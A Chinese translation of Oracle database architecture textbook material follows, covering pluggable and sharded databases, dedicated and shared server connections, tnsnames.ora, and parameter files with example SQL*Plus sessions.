  可插拔数据库不是直接由实例打开的，而是必须先启动一个 Oracle 实例，并由该实例挂载并打开容器数据库。一旦容器实例启动并运行，且容器数据库被打开，该容器数据库就可以打开多个可插拔数据库。每个可插拔数据库的行为都如同一个“独立”数据库。也就是说，它们看起来是自包含的、独立的“单一租户”数据库。但它们都共享同一个容器数据库和容器实例。


  **注意**


  在 Oracle 19c 及更高版本中，企业版数据库中最多可以包含三个由客户创建的可插拔数据库，无需额外许可。使用多租户许可，你可以在单个容器数据库中拥有多达
  4096 个独立的可插拔数据库。



  当你启动一个 Oracle 实例时，会有许多进程与之关联（更多内容见第 5 章）。每个实例由大约一百个左右的进程提供支持（具体数量因配置而异）。如果你尝试启动
  50 个单租户数据库——每个数据库都有一个与之关联的实例或其自己的实例——那么仅仅为了启动这些数据库，你就需要创建超过 5000 个进程！这对操作系统来说是极大的负担，无论是创建如此多的进程还是后续管理它们。


  此外，每个实例都会有自己的 SGA。第 4 章将介绍 SGA 中包含的内容，但可以说，其中存在大量重复。每个 SGA 都会在其共享池中缓存一份 `DBMS_OUTPUT`
  的副本，并且每个 SGA 都会有一个重做日志缓冲区和许多其他重复的数据结构。


  使用可插拔数据库，你可以实现应用程序元数据、用户、数据、代码等的分离，同时避免冗余的实例。也就是说，你可以通过单个实例与单个容器数据库（包含 Oracle 元数据、代码和数据）来提供对多个可插拔数据库的访问，每个可插拔数据库托管一个独立的应用程序。这能大幅降低服务器资源的消耗。通常，为这些应用程序可插拔数据库分配的那个单独的
  SGA 大小，将小于你原本需要为各个单独 SGA 分配的大小之和。


  从开发人员的角度来看，可插拔数据库与单租户数据库并无不同。应用程序连接数据库的方式，与它在早期版本中连接单租户数据库的方式完全相同。差异在于底层架构——即一个实例服务于多个可插拔数据库，以及由此带来的服务器资源消耗的减少和数据库管理员管理的便捷性。


  从数据库管理员的角度来看，数据库管理的方式发生了许多变化——都是积极的变化。例如，如果数据库管理员为 RAC 配置了一个容器数据库，那么该容器下的每个可插拔数据库都将启用
  RAC。Data Guard、RMAN 备份等方面也是如此。数据库管理员只需配置和使用一个实例，而不是像过去那样每个应用程序都需要一个实例。


  ### 多租户 RAC 数据库


  在多租户 RAC 数据库中，你有一个或多个实例连接到一个容器数据库。在该容器数据库内，有一个或多个可插拔数据库。图 2-4 展示了一个双节点 RAC 数据库，连接到一个名为
  `CDB` 的容器数据库，该容器包含两个可插拔数据库（`PDB1` 和 `PDB2`）。此配置中有两个实例（`CDB1` 和 `CDB2`）。RAC 容器数据库访问从每个节点都可见的共享
  `ASM` 磁盘。


  ![../images/319656_4_En_2_Chapter/319656_4_En_2_Fig4_HTML.jpg](img/319656_4_En_2_Fig4_HTML.jpg)


  图 2-4 包含两个可插拔数据库的双节点 RAC 容器数据库


  在此示例中，客户端发起到 `PDB1` 可插拔数据库的连接。这会连接到 RAC `SCAN` 监听器，该监听器将连接请求转交给其中一个数据库监听器（本例中为节点
  1）。监听器将客户端连接到 `CDB1` 实例中的一个服务器进程。在此配置中，客户端连接到 `CDB1` 实例并访问 `PDB1` 可插拔数据库。客户端无法看到容器内的其他可插拔数据库（`PDB2`）。换句话说，客户端只能访问其当前连接的可插拔数据库（本例中为
  `PDB1`）内的数据。


  ### 分区数据库


  从 Oracle 12.2 开始，`分区数据库` 特性是一个逻辑数据库，它水平分区分布在不共享任何硬件基础设施的物理数据库池上。换句话说，分片中的每个数据库都托管在拥有独立
  CPU、内存和磁盘的专用服务器上。从最终用户应用程序的角度看，`分区数据库` 在逻辑上就像一个数据库，但在底层，它由一个或多个物理数据库组成。


  `分区数据库` 中的每个数据库被称为一个 `分片`。数据库 `分片` 可以是单实例或多实例的 RAC 数据库。创建表时，需要指定一个列作为分布键。分布键可以定义为一致性、哈希或列表。每个
  `分区数据库` 环境都使用一个 `分区目录数据库`。`分区目录` 支持诸如自动化分片部署、`分区数据库` 的集中管理以及多分片查询等任务。还有 `分片导向器`，它们是监听器，负责基于分片键处理连接路由。


  图 2-5 （在较高层面上）展示了 `分区数据库` 的基本架构。客户端发起到与 `分区数据库` 关联的全局服务的连接。这将客户端连接到一个连接池。数据请求根据分片键被路由到适当的实例。


  ![../images/319656_4_En_2_Chapter/319656_4_En_2_Fig5_HTML.jpg](img/319656_4_En_2_Fig5_HTML.jpg)


  图 2-5 包含三个数据库 `分片` 的 `分区数据库`


  数据库分片的主要优点如下：


  *   `线性可扩展性`：你可以根据业务需求添加或移除 `分片`。

  *   `容错性`：数据库 `分片` 存在于独立的硬件上；因此，一个数据库 `分片` 的故障不会影响其他 `分片`。

  *   `数据的地理分布`：你可能出于法律原因或隐私法规要求而希望这样做。

  *   `滚动升级`：每个 `分片` 都可以独立升级。

  *   `区域性性能`：每个 `分片` 可以存在于特定的地理区域，拥有自己的硬件和存储配置。


  每个数据库 `分片` 都是自包含的，意味着每个 `分片` 都有自己的 SGA 和后台进程。因此，与 RAC（多个实例共享同一组物理数据库文件）不同，分片是多个数据库（每个都有自己的实例）呈现给最终用户时，被视为一个逻辑数据库。



  ## SGA 与后台进程


  正如本书前面章节所见，每个 Oracle 实例都拥有一大块称为 SGA 的内存，例如，它被用于完成以下工作：


  *   维护所有进程都需要访问的众多内部数据结构。

  *   缓存磁盘数据；在将重做数据写入磁盘前对其进行缓冲。

  *   保存已解析的 SQL 执行计划。

  *   等等。


  Oracle 有一组“附着”在该 SGA 上的进程，它们附着的机制因操作系统而异。在 UNIX/Linux 环境中，进程会物理附着到一个大的共享内存段上，这是一块在操作系统中分配的、可以被多个进程并发访问的内存（通常使用
  `shmget()` 和 `shmat()`）。在 Windows 下，这些进程只是简单地使用 C 语言调用 `malloc()` 来分配内存，因为它们实际上是一个大进程中的多个线程，因此共享同一个虚拟内存空间。


  Oracle 还有一组供数据库进程或线程读写的文件（并且只有 Oracle 进程被允许读写这些文件）。在单租户架构中，这些文件保存了我们所有的表数据、索引、临时空间、重做日志、PL/SQL
  代码等等。在多租户架构中，容器数据库将保存所有与 Oracle 相关的元数据、数据和代码；我们的应用程序数据将单独保存在一个可插拔数据库中。


  如果你在基于 UNIX/Linux 的系统上启动 Oracle 并执行 `ps` 命令，你会看到许多具有不同名称的物理进程正在运行。例如，如果你想查看系统监控进程，可以执行以下命令：


  ```

  $ ps -ef | grep smon

  oracle   19362     1  0 00:29 ?        00:00:00 ora_smon_CDB

  ```


  我将在第 5 章详细介绍这些进程，所以现在只需要知道它们通常被称为 `Oracle 后台进程`。它们是构成实例的持久性进程，从实例启动到关闭期间，你都能看到它们。


  有趣的是，这些是进程，而不是独立的程序。在 UNIX/Linux 上只有一个 Oracle 二进制可执行文件；它具有许多“角色”，这取决于它在启动时被告知要执行什么任务。用于启动
  `smon` 的那个二进制可执行文件，同样也用于启动 `检查点后台进程`。只有一个名为 `oracle` 的二进制可执行程序，它只是以不同的名称被执行了多次。


  ## 连接到 Oracle


  在本节中，我们将探讨两种最常见的让 Oracle 服务器处理请求的方式背后的机制：`专用服务器` 连接和 `共享服务器` 连接。我们将了解在客户端和服务器端为了建立连接以便登录并实际在数据库中工作所发生的事情。最后，我们将简要了解如何建立
  TCP/IP 连接；TCP/IP 是用于通过网络连接到 Oracle 的主要网络协议。并且我们将查看服务器上负责与服务器建立物理连接的监听器进程，在专用服务器连接和共享服务器连接的情况下是如何以不同方式工作的。


  ### 专用服务器


  如果我们使用专用服务器登录数据库，我们将看到一个新进程（在某些其他操作系统上是一个线程）被创建，专门为我们提供服务。例如：


  ```

  $ sqlplus system/foo@localhost:1521/PDB1

  ```


  现在使用进程状态命令，让我们查看专用服务器进程：


  ```

  $ ps -ef | grep $ORACLE_SID

  ```


  以下是输出的其中一部分，仅显示专用服务器进程：


  ```

  oracle   24443     1  0 02:03 ?        00:00:00 oracleCDB (LOCAL=NO)

  ```


  当我们注销时，这个额外的进程/线程将会消失。图 2-6 描绘了专用服务器的配置。


  ![../images/319655_4_En_2_Chapter/319655_4_En_2_Fig6_HTML.jpg](img/319655_4_En_2_Fig6_HTML.jpg)


  图 2-6 典型的专用服务器配置


  如前所述，通常 Oracle 会在我登录时为我创建一个新进程。这通常被称为专用服务器配置，因为一个服务器进程将在我的会话生命周期内专门服务于我。对于每个会话，都会出现一个新的专用服务器，形成一对一的映射。我的客户端进程（任何尝试连接到数据库的程序）将通过某种网络通道（例如
  TCP/IP 套接字）与此专用服务器直接通信。正是这个服务器进程接收我的 SQL 并为我执行。它会在必要时读取数据文件，并在数据库缓存中查找我的数据。它将执行我的更新语句。它将运行我的
  PL/SQL 代码。它唯一的目标就是响应我提交给它的 SQL 调用。



  ## 共享服务器


  Oracle 也可以以一种称为 `shared server` 的模式接受连接，在此模式下，您不会看到为每个用户连接创建额外的线程或出现新的 UNIX/Linux
  进程。


  > 注意

  > 在旧版 Oracle 中，`shared server` 被称为 `multithreaded server` 或 `MTS`。这个遗留名称现已不再使用。


  在 `shared server` 模式中，Oracle 为大量的用户使用一个共享的进程池。`shared servers` 本质上是一种连接池机制。系统不是为
  10,000 个数据库会话分配 10,000 个专用服务器（那将会是巨量的进程或线程），而是使用占总数一小部分的进程或线程，这些进程（顾名思义）由所有会话共享。这使得
  Oracle 能够将比通常情况下多得多的用户连接到实例。我们的机器可能无法承受管理 10,000 个进程的负载，但管理 100 或 1000 个进程是可行的。在
  `shared server` 模式下，共享进程通常随数据库启动，并出现在 `ps` 命令的列表中。


  `shared server` 连接与 `dedicated server` 连接的一个很大区别在于，连接到数据库的客户端进程从不直接与 `shared server`
  通信，就像它与 `dedicated server` 那样。它无法直接与 `shared server` 对话，因为该进程实际上是共享的。为了共享这些进程，我们需要另一种“对话”机制。Oracle
  为此目的采用了一个称为 `dispatcher` 的进程（或一组进程）。客户端进程将通过网络与 `dispatcher` 进程对话。`dispatcher` 进程会将客户端的请求放入
  SGA 中的请求队列（这是 SGA 的众多用途之一）。第一个不忙的 `shared server` 将获取此请求并进行处理（例如，请求可能是 `UPDATE T
  SET X = X+5 WHERE Y = 2`）。此命令完成后，`shared server` 会将响应放入调用 `dispatcher` 的响应队列。`dispatcher`
  进程监控此队列，并在看到结果后将其传输回客户端。从概念上讲，`shared server` 请求的流程如图 2-7 所示。


  ![../images/319655_4_En_2_Chapter/319655_4_En_2_Fig7_HTML.jpg](img/319655_4_En_2_Fig7_HTML.jpg)


  **图 2-7**

  `shared server` 请求的步骤


  如图 2-7 所示，客户端连接将请求发送给 `dispatcher`。`dispatcher` 会首先将此请求放入 SGA 的请求队列 (1)。第一个可用的 `shared
  server` 将出队此请求 (2) 并进行处理。当 `shared server` 完成后，响应（返回码、数据等）被放入响应队列 (3)，随后由 `dispatcher`
  拾取 (4) 并传回给客户端。


  就开发人员而言，从概念上讲，`shared server` 连接和 `dedicated server` 连接没有区别。在架构上，它们差异很大，但应用程序对此并不明显。


  既然您理解了什么是 `dedicated server` 和 `shared server` 连接，您可能有以下问题：


  *   我最初是如何连接的？

  *   是什么启动了这个 `dedicated server`？

  *   我如何与 `dispatcher` 取得联系？


  答案取决于您的具体平台，但以下各节将概述这个过程。


  ## 通过 TCP/IP 连接的机制


  我们将研究最常见的网络情况：通过 TCP/IP 发起的基于网络的连接请求。在这种情况下，客户端位于一台机器上，服务器位于另一台机器上，两者通过 TCP/IP 网络连接。一切都始于客户端。客户端使用
  Oracle 客户端软件（一组提供的应用程序编程接口，或 API）发出连接到数据库的请求。客户端可以是您笔记本电脑上的 `SQL*Plus`、使用 `JDBC`
  连接的应用程序、`TOAD`、`SQL Developer` 等。


  在客户端，当您连接到 Oracle 实例时，需要提供一个 `connection string`。`connection string` 包含允许您的客户端软件通过网络定位并连接到远程数据库实例的信息。连接字符串由以下信息组成：


  *   `Username`：有时也称为模式名或数据库用户账户。

  *   `Password`：分配给用户名的密码。

  *   `Hostname (or IP address)`：数据库运行所在的主机（服务器）。

  *   `Port`：数据库监听器正在监听的端口。默认端口是 `1521`。

  *   `Service name`：从概念上讲，您可以将服务名称视为您要连接的数据库实例的同义词。服务名称通常就是您正在连接的实例名称或可插拔数据库名称。更技术性地说，服务名称代表具有共同属性、服务级别阈值和优先级的应用程序组。提供该服务的实例数量对应用程序是透明的，每个数据库实例可能向监听器注册为愿意提供许多服务。因此，服务被映射到物理数据库实例，并允许
  DBA 将某些阈值和优先级与之关联。


  如果您使用 `SQL*Plus` 客户端连接到 Oracle 实例，可以在命令行上指定所有上述信息（这称为 `easy connect` 方法）。`easy connect`
  方法的连接基本语法如下：


  ```

  database_host[:port][/[service_name]

  ```


  例如，这里我以用户 `scott` 连接，密码为 `tiger`，主机名为 `localhost`，监听器端口为 `1521`，可插拔数据库是 `ORCL`：


  ```

  $ sqlplus scott/tiger@localhost:1521/ORCL

  ```


  从 Oracle 19c 开始，`easy connect` 语法得到显著增强，并更名为 `easy connect plus`。这种增强的连接语法使得钱包使用、TLS
  连接、负载均衡、连接超时等更加容易。这在访问 Oracle 云基础设施 (OCI) 中可能需要 TLS 进行安全通信和钱包信息的服务时非常有用。下面列出了 `easy
  connect plus` 语法（这应该写在一行，但在此页面上无法整齐地显示）：


  ```

  [[protocol:]//]host1{,host2}[:port1]{,host2:port2}[/[service_name]

  [:server_type][/instance_name]][?parameter_name=value{&parameter_name=value}]

  ```


  例如，使用 `easy connect plus` 语法连接到 Oracle 云基础设施中的数据库，并指定所需的 SSL 传输信息（这个相当长的连接字符串应该写在一行，但在此页面上无法整齐地显示）：


  ```

  $ sqlplus scott/tiger@tcps://adb.us-phoenix-1.oraclecloud.com:1522/gjsogz09yzhnqz4_db202102062120_high.adb.oraclecloud.com?ssl_server_cert_dn

  ="CN=adwc.uscom-east-1.oraclecloud.com,OU=Oracle BMCS US,O=Oracle Corporation,L=Redwood
  City,ST=California,C=US"

  ```



  ## 使用 `tnsnames.ora` 管理连接信息


  虽然之前的简单连接方法有效，但通常更方便的做法是将服务连接信息放在一个文件中，然后在连接到实例时引用该文件中的条目。如果你的环境中有一个以上的数据库，尤其如此。在
  Oracle 中，`tnsnames.ora` 文件就是被设计用来保存此数据库连接信息的。这个纯文本配置文件通常位于 `$ORACLE_HOME/network/admin`
  目录下（`$ORACLE_HOME` 代表 Oracle 安装目录的完整路径）。例如，我的 `tnsnames.ora` 文件中有两个条目，一个是用于我笔记本电脑上的本地数据库：


  ```

  ORCL=

  (DESCRIPTION =

  (ADDRESS = (PROTOCOL = TCP)(HOST = localhost)(PORT = 1521))

  (CONNECT_DATA =

  (SERVER = DEDICATED)

  (SERVICE_NAME = ORCL)

  )

  )

  ```


  另一个是连接到 Oracle 云中数据库的条目：


  ```

  OCLD = (description= (retry_count=20)(retry_delay=3)(address=(protocol=tcps)(port=1522)(host=adb.us-phoenix-1.oraclecloud.com))(connect_data=(service_name=sogz09yzhnqz4_db202102062120_high.adb.oraclecloud.com))(security=(ssl_server_cert_dn="CN=adwc.uscom-east-1.oraclecloud.com,OU=Oracle
  BMCS US,O=Oracle Corporation,L=Redwood City,ST=California,C=US")))

  ```


  > **提示**：TNS 代表 Transparent Network Substrate，它是内置于 Oracle 客户端中的“基础”软件，用于处理远程连接，实现点对点通信。


  要使用 `tnsnames.ora` 文件，你只需使用在文件中放置的条目名称。客户端软件（本例中为 SQL\*Plus）默认会在 `$ORACLE_HOME/network/admin`
  目录下查找 `tnsnames.ora` 文件，以获取与 `ORCL` 条目关联的连接详细信息，并使用该信息连接到我的可插拔数据库：


  ```

  $ sqlplus scott/tiger@ORCL

  ```


  接下来是连接到 Oracle 云中数据库的样子：


  ```

  $ sqlplus scott/tiger@OCLD

  ```


  这些字符串（`ORCL` 或 `OCLD`）也可以通过其他方式解析。例如，可以使用轻量级目录访问协议（LDAP）服务器提供的命名服务来解析，其目的类似于用于主机名解析的
  DNS。然而，在大多数中小型安装中（以需要连接到数据库的主机数量衡量），使用 `tnsnames.ora` 文件是很常见的，因为这种配置文件的副本数量是可管理的。


  ## 连接建立过程


  既然客户端软件知道要连接到哪里，它将打开一个到具有指定主机名和端口的服务器的 TCP/IP 套接字连接。连接到我笔记本电脑上的实例使用的主机名是 `localhost`，端口是
  `1521`（默认端口，也可以配置为其他端口）。如果我们的服务器的 DBA（我）已经安装并配置了 Oracle Net，并且监听器正在端口 `1521` 上监听连接请求，那么这个连接可能会被接受。在网络环境中，我们的服务器上将运行一个称为
  TNS 监听器的进程。正是这个监听器进程将我们物理连接到我们的数据库。当它接收到入站连接请求时，会检查请求，并根据其自己的配置文件，要么拒绝该请求（因为没有这样的服务，例如，或者我们的
  IP 地址已被禁止连接到此主机），要么接受它并着手让我们建立连接。


  ### 专用服务器连接


  如果我们正在建立专用服务器连接，监听器进程将为我们创建一个专用服务器。在 UNIX/Linux 上，这是通过 `fork()` 和 `exec()` 系统调用实现的（在
  UNIX/Linux 中，初始化后创建新进程的唯一方式是通过 `fork()`）。新的专用服务器进程继承由监听器建立的连接，我们现在就物理连接到了数据库。在 Windows
  上，监听器进程请求数据库进程为该连接创建一个新线程。一旦这个线程被创建，客户端就被“重定向”到它，我们就物理连接上了。在 UNIX/Linux 中的图示如图 2-8
  所示。


  ![../images/319655_4_En_2_Chapter/319655_4_En_2_Fig8_HTML.jpg](img/319655_4_En_2_Fig8_HTML.jpg)


  **图 2-8** 监听器进程与专用服务器连接


  ### 共享服务器连接


  然而，如果我们发出的是共享服务器连接请求，监听器的行为会有所不同。这个监听器进程知道我们在实例中运行的调度程序。当连接请求被接收时，监听器将从可用的调度程序池中选择一个调度程序进程。监听器要么将描述客户端如何连接到调度程序进程的连接信息发送回客户端，要么（如果可能）将连接移交给调度程序进程（这取决于操作系统和数据库版本，但最终效果是一样的）。当监听器发回连接信息时，它的工作就完成了，因为监听器运行在主机上一个众所周知的主机名和端口上，但调度程序也在该服务器上随机分配的端口接受连接。调度程序会让监听器知晓这些随机的端口分配，并会为我们选择一个调度程序。然后，客户端断开与监听器的连接，并直接连接到调度程序。我们现在就物理连接到了数据库。图
  2-9 说明了这个过程。


  ![../images/319655_4_En_2_Chapter/319655_4_En_2_Fig9_HTML.jpg](img/319655_4_En_2_Fig9_HTML.jpg)


  **图 2-9** 监听器进程与共享服务器连接


  从客户端的角度来看，它并不关心也不知道自己是在进行专用服务器连接还是共享服务器连接。最终结果应该是成功连接到数据库实例，以便客户端可以与数据库交互。


  ## 总结


  这完成了我们对 Oracle 架构的概述。在本章中，我们定义了 `database`、`instance`、`container database`、`pluggable
  database`、`real application cluster (RAC) database` 和 `sharded database` 这些术语。理解
  Oracle 的多租户架构尤为重要，因为这是 Oracle 推荐的未来架构。非 CDB 数据库的使用将在未来某个时间被 Oracle 停止支持。


  我们还了解了如何通过专用服务器连接或共享服务器连接来连接到数据库。值得注意的是，一个 Oracle 实例可以同时使用两种连接类型。实际上，一个 Oracle 数据库总是支持专用服务器连接——即使配置为共享服务器。


  现在，你已准备好更深入地查看构成数据库的文件以及服务器背后的进程——它们的作用以及它们如何相互作用。你也准备好查看 SGA 内部，看看它包含什么以及其目的是什么。在下一章，你将开始了解
  Oracle 用来管理数据的文件类型以及每种文件类型的作用。



  '
- "# 3. 文件\n\n在本章中，我们将研究构成数据库和实例的八种主要文件类型。与实例相关的文件很简单：\n\n*   **参数文件**：这些文件告诉 Oracle\
  \ 实例在哪里可以找到控制文件，它们还指定了某些初始化参数，用于定义某些内存结构的大小等等。我们将探讨存储数据库参数文件的两种可用选项。\n\n*   **跟踪文件**：这些是由服务器进程创建的诊断文件，通常是在响应某些异常错误条件时生成的。\n\
  \n*   **告警文件**：这些文件与跟踪文件类似，但它们包含关于“预期”事件的信息，并且还以单一、集中的文件形式向 DBA 告警许多数据库事件。\n\n构成数据库的文件是：\n\
  \n*   **数据文件**：这些是数据库使用的文件；它们存储你的表、索引以及所有其他数据段类型。\n\n*   **临时文件**：这些文件用于基于磁盘的排序和临时存储。\n\
  \n*   **控制文件**：这些文件告诉你数据文件、临时文件和重做日志文件的位置，以及有关它们状态的其他相关元数据。它们还包含由 `RMAN`（Recovery\
  \ Manager，备份与恢复工具）维护的备份信息。\n\n*   **重做日志文件**：这些是你的事务日志。\n\n*   **口令文件**：这些文件用于验证通过网络执行管理活动的用户。我们将不会详细讨论这些文件。如果你想通过网络远程连接到实例并以\
  \ `SYS` 用户身份登录，则需要这些文件。这些文件在 `Data Guard` 配置（主数据库和备用数据库）中也是必需的。\n\nOracle 使用几种可选的文件类型来加快备份和恢复操作。这两种文件是：\n\
  \n*   **更改跟踪文件**：此文件有助于实现 Oracle 数据的真正增量备份。它不必位于快速恢复区中，但由于它纯粹与数据库备份和恢复相关，我们将在该区域的背景下进行讨论。\n\
  \n*   **闪回日志文件**：这些文件存储数据库块的“前映像”，以便于执行 `FLASHBACK DATABASE` 命令。\n\n我们还将看看通常与数据库关联的其他类型的文件，例如：\n\
  \n*   **数据泵文件**：这些文件由 Oracle Data Pump Export 进程生成，并由 Data Pump Import 进程使用。这种文件格式也可以由外部表创建和使用。\n\
  \n*   **平面文件**：这些是你可以在文本编辑器中查看的普通旧文件。你通常使用它们将数据加载到数据库中。\n\n这些列表中最重要的文件是数据文件和重做日志文件，因为它们包含了你辛勤积累的数据。我可以丢失任何和所有其余文件，仍然能够访问我的数据。如果我丢失了重做日志文件，我可能开始丢失一些数据。如果我丢失了数据文件及其所有备份，我无疑将永远失去那些数据。\n\
  \n我们现在将看看这些文件的类型、它们通常的位置、命名方式以及我们可能期望在其中找到的内容。\n\n## 参数文件\n\n与 Oracle 数据库关联的参数文件有很多种，从客户端工作站上的\
  \ `tnsnames.ora` 文件（用于“找到”网络上的服务器），到服务器上的 `listener.ora` 文件（用于网络监听器启动），再到 `sqlnet.ora`、`cman.ora`\
  \ 和 `ldap.ora` 文件等等。然而，最重要的参数文件是数据库的参数文件——没有它，我们甚至无法启动实例。其余的文件很重要；它们都与网络和连接到数据库相关。但是，它们超出了我们讨论的范围。关于它们的配置和设置信息，我建议你参考\
  \ *Database Net Services Administrator’s Guide*。这些文件通常由 DBA（而非开发人员）设置。\n\n数据库的参数文件通常称为\
  \ init 文件，或 `init.ora` 文件。这是由于其历史上的默认名称是 `init<ORACLE_SID>.ora`。我称其为“历史上的”是因为 Oracle\
  \ 此后实现了一种极大改进的存储数据库参数设置的方法：服务器参数文件，或简称 `SPFILE`。该文件的默认名称是 `spfile<ORACLE_SID>.ora`。我们将分别看看这两种参数文件。\n\
  \n注意\n\n对于那些不熟悉 `SID` 或 `ORACLE_SID` 术语的人来说，需要给出一个完整的定义。`SID` 是一个*站点标识符*。在 UNIX/Linux\
  \ 中，它和 `ORACLE_HOME`（Oracle 软件安装的位置）一起被哈希处理，以创建一个用于创建或附加共享全局区域（`SGA`）内存区域的唯一键名。如果你的\
  \ `ORACLE_SID` 或 `ORACLE_HOME` 设置不正确，并且你使用的是本地（而非基于网络的）连接，你将得到 `ORACLE NOT AVAILABLE`\
  \ 错误，因为你无法附加到由此唯一键标识的共享内存段。在 Windows 上，共享内存的使用方式与 UNIX/Linux 不同，但 `SID` 仍然很重要。你可以在同一个\
  \ `ORACLE_HOME` 下拥有多个数据库，因此你需要一种方法来唯一标识与每个数据库关联的实例及其配置文件。\n\n没有参数文件，你就无法启动 Oracle\
  \ 数据库。这使得参数文件相当重要，Oracle 的备份和恢复工具 Recovery Manager (`RMAN`) 认识到这个文件的重要性，并允许你将服务器参数文件（但不是旧式的\
  \ `init.ora` 参数文件类型）包含在你的备份集中。然而，由于 `init.ora` 文件只是一个纯文本文件，你可以用任何文本编辑器创建它，因此它并不是一个你必须用生命守护的文件。你可以重新创建它，只要你知道里面曾经有什么（例如，如果你有权访问该数据库的告警日志，你可以从中检索该信息，并重建你的整个\
  \ `init.ora` 参数文件）。\n\n我们现在将依次研究两种类型的数据库启动参数文件（`init.ora` 和 `SPFILE`），但在此之前，让我们先看看数据库参数文件是什么样子。\n\
  \n\n### 什么是参数？\n\n简单来说，数据库参数可以被视为一个键/值对。要查看实例参数的当前值，可以查询 `V$` 视图 `V$PARAMETER`。或者，在\
  \ `SQL*Plus` 中，你可以使用 `SHOW PARAMETER` 命令，例如：\n\n```bash\n$ sqlplus / as sysdba\n\
  SQL> select value from v$parameter where name = 'db_block_size';\nVALUE\n\nSQL>\
  \ show parameter db_block_s\nNAME                                 TYPE        VALUE\n\
  ------------------------------------ ----------- -------\ndb_block_size        \
  \                integer     8192\n```\n\n两种输出显示的基本信息相同，尽管从 `V$PARAMETER` 可以获取更多信息（比此示例中显示的列要多得多）。但\
  \ `SHOW PARAMETER` 在易用性上更胜一筹，并且它能自动进行“通配符匹配”。注意，我只输入了 `db_block_s`；`SHOW PARAMETER`\
  \ 会自动在前后添加 `%`。\n\n**注意**\n\n所有 `V$` 视图和所有数据字典视图在 *Oracle Database Reference* 手册中都有完整文档记录。请将该手册视为特定视图中可用内容的权威来源。\n\
  \n如果你以权限较低的用户执行前面的示例（本书中 `EODA` 已被授予 `DBA` 角色），你将看到如下内容：\n\n```sql\nSQL> connect\
  \ scott/tiger@PDB1\nConnected.\nSQL> select value from v$parameter where name =\
  \ 'db_block_size';\nselect value from v$parameter where name = 'db_block_size'\n\
  *\nERROR at line 1:\nORA-00942: table or view does not exist\nSQL> show parameter\
  \ db_block_s\nORA-00942: table or view does not exist\n```\n\n默认情况下，“普通”账户未被授予访问\
  \ `V$` 性能视图的权限。你必须将 `V$PARAMETER` 上的 `select` 权限授予 `SCOTT`。以 `DBA` 账户执行以下操作：\n\n\
  ```sql\n$ sqlplus / as sysdba\nSQL> alter session set container=PDB1;\nSQL> grant\
  \ select on sys.v_$parameter to scott;\n```\n\n如果你重新连接回 `SCOTT` 架构，现在应该能够查看参数了。值得一提的是，还有第三种方式可以通过\
  \ `DBMS_UTILITY` 包查看数据库参数（你仍然需要内部视图上的 `select` 权限才能通过此方式检索参数值）。示例如下：\n\n```sql\n\
  SQL> conn scott/tiger@PDB1\nSQL> create or replace\nfunction get_param( p_name in\
  \ varchar2 )\nreturn varchar2\nas\nl_param_type  number;\nl_intval      binary_integer;\n\
  l_strval      varchar2(256);\ninvalid_parameter exception;\npragma exception_init(\
  \ invalid_parameter, -20000 );\nbegin\nbegin\nl_param_type :=\ndbms_utility.get_parameter_value\n\
  ( parnam => p_name,\nintval => l_intval,\nstrval => l_strval );\nexception\nwhen\
  \ invalid_parameter\nthen\nreturn '*access denied*';\nend;\nif ( l_param_type =\
  \ 0 )\nthen\nl_strval := to_char(l_intval);\nend if;\nreturn l_strval;\nend get_param;\n\
  /\nFunction created.\n```\n\n如果你在 `SQL*Plus` 中执行此函数，将会看到：\n\n```sql\nSQL> set serverout\
  \ on\nSQL> exec dbms_output.put_line( get_param( 'db_block_size' ) );\n\nPL/SQL\
  \ procedure successfully completed.\n```\n\n并非每个参数都能通过 `dbms_utility.get_parameter_value`\
  \ API 调用获取。具体来说，内存相关参数（如 `sga_max_size`、`db_cache_size`、`pga_aggregate_target` 等）是不可见的。我们在代码的第\
  \ 17 到 21 行处理了这种情况——当遇到不允许查看的参数时，我们返回 `'*access denied*'`。如果你对整个受限参数列表感到好奇，你可以（任何被授予此函数\
  \ `EXECUTE` 权限的账户都可以）执行以下查询：\n\n```sql\n$ sqlplus scott/tiger@PDB1\nSQL> select\
  \ name, scott.get_param( name ) val\nfrom v$parameter\nwhere scott.get_param( name\
  \ ) = '*access denied*';\nNAME                           VAL\n------------------------------\
  \ --------------------\nsga_max_size                   *access denied*\nshared_pool_size\
  \               *access denied*\nlarge_pool_size                *access denied*\n\
  java_pool_size                 *access denied*\nstreams_pool_size              *access\
  \ denied*\n...\nclient_result_cache_lag        *access denied*\nolap_page_pool_size\
  \            *access denied*\n33 rows selected.\n```\n\n**注意**\n\n在不同的版本上，此查询的结果会不同。随着参数数量的变化，你应该预期无法访问的参数的数量和值会随时间推移而增减。\n\
  \n参数的数量（及其名称）因版本而异。大多数参数（如 `db_block_size`）的生命周期非常长（它们不会因版本更迭而消失），但随着时间的推移，许多其他参数随着实现方式的变化而变得过时。例如，曾经有一个\
  \ `distributed_transactions` 参数，可以设置为某个正整数，用于控制数据库可以执行的并发分布式事务数。它在之前的版本中可用，但在任何近期的\
  \ Oracle 版本中都找不到。事实上，在后续版本中尝试使用该参数会引发错误。例如：\n\n```sql\n$ sqlplus / as sysdba\nSQL>\
  \ alter system set distributed_transactions = 10;\nalter system set distributed_transactions\
  \ = 10\n*\nERROR at line 1:\nORA-25138: DISTRIBUTED_TRANSACTIONS initialization\
  \ parameter has been made\nobsolete\n```\n\n如果你想查看参数并了解哪些参数可用以及每个参数的作用，请参阅 *Oracle\
  \ Database Reference* 手册。该手册的第一章详细检查了每个已记录的参数。总体而言，分配给每个参数的默认值（或者对于从其他参数获取默认设置的参数而言，其派生值）对于大多数系统来说已经足够。通常，某些参数的值（例如\
  \ `control_files` 参数（指定系统上控制文件的位置）、`db_block_size`、各种内存相关参数等）需要为每个数据库唯一设置。\n\n请注意我在上一段中使用了“已记录的”这个术语。同样也存在未记录的参数。你可以通过它们的名称以下划线\
  \ (`_`) 开头来识别这些参数。关于这些参数有许多猜测。由于它们未被记录，有些人认为它们必定是“神奇的”，并且许多人假设它们为 Oracle 内部人员所熟知和使用。事实上，我发现情况恰恰相反。它们并不广为人知，也很少被使用。实际上，这些未记录参数中的大多数相当乏味，因为它们代表已弃用的功能和向后兼容性标志。另一些则有助于数据恢复，而不是数据库本身的恢复；例如，其中一些参数使数据库能在某些极端情况下启动，但仅够提取数据。之后你必须重建数据库。\n\
  \n除非 Oracle 技术支持如此指导你，否则没有理由在配置中使用未记录参数。许多参数具有可能造成灾难性后果的副作用。在我的生产数据库中，我不希望使用任何未记录的设置。\n\
  \n**警告**\n\n仅在 Oracle 技术支持要求时使用未记录参数。它们的使用可能损害数据库，并且它们的实现方式可能会——也将会——随版本更迭而改变。\n\
